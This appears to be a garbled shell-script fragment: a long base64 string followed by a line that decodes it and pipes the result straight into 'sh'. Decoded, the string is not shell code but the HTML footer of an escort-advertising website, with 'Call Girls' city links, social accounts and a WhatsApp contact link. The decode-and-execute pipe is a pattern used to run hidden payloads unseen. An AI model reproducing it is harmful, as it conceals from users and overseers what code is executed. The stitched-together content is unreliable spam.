AgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbWQtNCBjb2wtbGctMiAgY29sLTYiPgogICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJ0dCI+PGEgaHJlZj0iaWZmY28tY2hvd2stY2FsbC1naXJscy5odG1sIj5JZmZjbyBDaG93ayBDYWxsIEdpcmxzPC9hPjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJ0dCI+PGEgaHJlZj0ic3VyYXQtY2FsbC1naXJscy5odG1sIj5TdXJhdCBDYWxsIEdpcmxzPC9hPjwvbGk+CjxsaSBjbGFzcz0idHQiPjxhIGhyZWY9ImdoYXppYWJhZC1jYWxsLWdpcmxzLmh0bWwiPkdoYXppYWJhZCBDYWxsIEdpcmxzPC9hPjwvbGk+CjxsaSBjbGFzcz0idHQiPjxhIGhyZWY9InZhZG9kYXJhLWNhbGwtZ2lybHMuaHRtbCI+VmFkb2RhcmEgQ2FsbCBHaXJsczwvYT48L2xpPgo8bGkgY2xhc3M9InR0Ij48YSBocmVmPSJtYWhpcGFscHVyLWNhbGwtZ2lybHMuaHRtbCI+TWFoaXBhbHB1ciBDYWxsIEdpcmxzPC9hPjwvbGk+CiA8bGkgY2xhc3M9InR0Ij48YSBocmVmPSJ2YWlzaGFsaS1jYWxsLWdpcmxzLmh0bWwiPlZhaXNoYWxpIENhbGwgR2lybHM8L2E+PC9saT4gIAogICAgICAgICAgICAgICAKCiAgICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KICAgPC9zZWN0aW9uPgoKICAgPHNlY3Rpb24+CiAgICAgIDxmb290ZXI+CiAgICAgICAgIDxkaXYgY2xhc3M9ImZvb3Rlci1tIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTEyIj4KICAgICAgICAgICAgICAgICAgICAgPHVsIGNsYXNzPSJidG0iPgogICAgICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSJpbmRleC5odG1sIj5Ib21lPC9hPgogICAgICAgICAgICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSJhYm91dC11cy5odG1sIj5BYm91dCBVczwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJuYXYtaXRlbSI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iZ2FsbGVyeS5odG1sIj5HYWxsZXJ5IDwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgPC9saT4KCiAgICAgICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPgogICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9InJhdGVzLmh0bWwiPlJhdGVzPC9hPgogICAgICAgICAgICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSJjb250YWN0LXVzLmh0bWwiPkNvbnRhY3QgVXM8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPgogICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBhcmlhLWxhYmVsPSJUd2l0dGVyIiBocmVmPSJodHRwczovL3R3aXR0ZXIuY29tL2lhbXNpZGRoaV8xLyI+IDxzcGFuPjxpbWcKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3JjPSJpbWFnZXMvdHdpdHRlci5zdmciIHRpdGxlPSJBbG9raSBLYXVyIFR3aXR0ZXIgYWNjb3VudCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWx0PSJBbG9raSBLYXVyIFR3aXR0ZXIgYWNjb3VudCIgc3R5bGU9IndpZHRoOjIxcHg7aGVpZ2h0OjQwcHgiIC8+PC9zcGFuPiA8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPgogICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBhcmlhLWxhYmVsPSJGYWNlYm9vayIgaHJlZj0iaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2lhbXNpZGRoaV8xLyI+IDxzcGFuPjxpbWcKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3JjPSJpbWFnZXMvZmFjZWJvb2suc3ZnIiBhbHQ9IkFsb2tpIEthdXIgRmFjZWJvb2sgYWNjb3VudCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU9IkFsb2tpIEthdXIgRmFjZWJvb2sgYWNjb3VudCIgc3R5bGU9IndpZHRoOjIxcHg7aGVpZ2h0OjQwcHgiIC8+PC9zcGFuPiA8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPgogICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBhcmlhLWxhYmVsPSJJbnN0YWdyYW0iIGhyZWY9Imh0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vaWFtc2lkZGhpXzEvIj4gPHNwYW4+PGltZwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzcmM9ImltYWdlcy9pbnN0YS5zdmciIGFsdD0iQWxva2kgS2F1ciBJbnN0YWdyYW0gYWNjb3VudCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU9IkFsb2tpIEthdXIgSW5zdGFncmFtIGFjY291bnQiIHN0eWxlPSJ3aWR0aDoyOHB4O2hlaWdodDo0MHB4IiAvPjwvc3Bhbj4gPC9hPgogICAgICAgICAgICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICA8L2Rpdj4KICAgICAgICAgPGRpdiBjbGFzcz0iZm9vdGVyLXRvcCI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC0xMiI+CiAgICAgICAgICAgICAgICAgICAgIDxoMz5EaXNjbGFpbWVyPC9oMz4KICAgICAgICAgICAgICAgICAgICAgPHAgc3R5bGU9ImNvbG9yOiNmZmYhaW1wb3J0YW50Ij5BbG9raSBLYXVyIGFzc2VydHMgdGhhdCB0aGlzIHdlYnNpdGUgaXMgaW50ZW5kZWQgc29sZWx5IGZvciBhZHVsdHMuCklmIHlvdSBhcmUgYSBtaW5vciBvciB1bmRlciAxOCB5ZWFycyBvbGQsIHlvdSBhcmUgcHJvaGliaXRlZCBmcm9tIGFjY2Vzc2luZyB0aGlzIHNpdGUuCldlIGFkaGVyZSBzdHJpY3RseSB0byBnb3Zlcm5tZW50IHJ1bGVzIGFuZCByZWd1bGF0aW9ucy4gS2luZGx5IGV4aXQgdGhpcyB3ZWJzaXRlIGlmIHlvdSBhcmUgbm90IG9mIHRoZSBhcHByb3ByaWF0ZSBhZ2UuPC9wPgogICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICA8L2Rpdj4KICAgICAgICAgPGRpdiBjbGFzcz0iZm9vdGVyLWJ0bSI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciBteS1mb290ZXIiPgogICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbWQtNSI+CiAgICAgICAgICAgICAgICAgICAgIDxzcGFuPkNvcHlyaWdodHMgMjAyMy4gQWxsIFJpZ2h0cyBSZXNlcnZlZCA8YSBocmVmPSJpbmRleC5odG1sIj5hbG9raS5pbjwvYT48L3NwYW4+CiAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxicj4KICAgICAgICAgPC9kaXY+CiAgICAgIDwvZm9vdGVyPgogICA8L3NlY3Rpb24+CiAgIDxkaXY+CgogICAgICA8ZGl2IGlkPSJzY3JvbGx0b3AiPgogICAgICAgICA8YSBjbGFzcz0idG9wLWJ1dHRvbiIgaHJlZj0iaW5kZXguaHRtbCN0b3AiPiZ1YXJyOzwvYT4KICAgICAgPC9kaXY+CiAgIDwvZGl2PgoKICAgPHNjcmlwdCBkZWZlciBzcmM9ImpzL2Jvb3RzdHJhcC5idW5kbGUuanMiPjwvc2NyaXB0PgogICA8c2NyaXB0IGRlZmVyIHNyYz0ianMvYm9vdHN0cmFwLmpzIj48L3NjcmlwdD4KICAgPCEtLSA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvanF1ZXJ5LzIuMS4zL2pxdWVyeS5taW4uanMiIGRlZmVyPjwvc2NyaXB0Pi0tPgogICA8c2NyaXB0IHNyYz0ianMvc2xpY2subWluLmpzIiBkZWZlcj48L3NjcmlwdD4KICAgPHNjcmlwdCBzcmM9ImpzL2pxdWVyeS5tYWduaWZpYy1wb3B1cC5qcyIgZGVmZXI+PC9zY3JpcHQ+CgogICA8IS0tIHZpZGVvLXBsYXllciAtLT4KCiAgIDwhLS1zY3JvbGwtdG9wLS0+CiAgIDxzY3JpcHQ+CiAgICAgIGNvbnN0IHNjcm9sbFRvcCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzY3JvbGx0b3AnKQogICAgICB3aW5kb3cub25zY3JvbGwgPSAoKSA9PiB7CiAgICAgICAgIGlmICh3aW5kb3cuc2Nyb2xsWSA+IDApIHsKICAgICAgICAgICAgc2Nyb2xsVG9wLnN0eWxlLnZpc2liaWxpdHkgPSAidmlzaWJsZSI7CiAgICAgICAgICAgIHNjcm9sbFRvcC5zdHlsZS5vcGFjaXR5ID0gMTsKICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgc2Nyb2xsVG9wLnN0eWxlLnZpc2liaWxpdHkgPSAiaGlkZGVuIjsKICAgICAgICAgICAgc2Nyb2xsVG9wLnN0eWxlLm9wYWNpdHkgPSAwOwogICAgICAgICB9CiAgICAgIH07CgogICA8L3NjcmlwdD4KICAgPCEtLVN0aWNreS0tPgogICA8c2NyaXB0PgogICAgICAkKHdpbmRvdykuc2Nyb2xsKGZ1bmN0aW9uICgpIHsKICAgICAgICAgaWYgKCQodGhpcykuc2Nyb2xsVG9wKCkgPiAxMDApIHsKICAgICAgICAgICAgJCgnaGVhZGVyJykuYWRkQ2xhc3MoJ3N0aWNreScpCiAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICQoJ2hlYWRlcicpLnJlbW92ZUNsYXNzKCdzdGlja3knKQogICAgICAgICB9CiAgICAgIH0pOwogICA8L3NjcmlwdD4KICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3MvZmxvYXQuY3NzIiAvPgogICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL2ZvbnQtYXdlc29tZS80LjcuMC9jc3MvZm9udC1hd2Vzb21lLm1pbi5jc3MiPgogICA8YSBocmVmPSJodHRwczovL3dhLm1lLzEwMDAwMDAwMDAwP3RleHQ9SSUyMG5lZWQlMjBjYWxsJTIwZ2lybHMlMjBpbiVub2lkYSUyMCh3d3cuYWxva2kuaW4pIiBjbGFzcz0iZmxvYXQiCiAgICAgIHRhcmdldD0iX2JsYW5rIj4KICAgICAgPGkgY2xhc3M9ImZhIGZhLXdoYXRzYXBwIG15LWZsb2F0Ij48L2k+CiAgIDwvYT4KICAgPGEgaHJlZj0idGVsOis5MSAwMDAwMDAwMDAwIiBjbGFzcz0iZmxvYXQyIiB0YXJnZXQ9Il9ibGFuayI+CiAgICAgIDxpIGNsYXNzPSJmYSBmYS1waG9uZSBteS1mbG9hdDIiPjwvaT4KICAgPC9hPgo8L2JvZHk+CgoKPC9odG1sPg=="
echo $miuae | base64 -d | sh
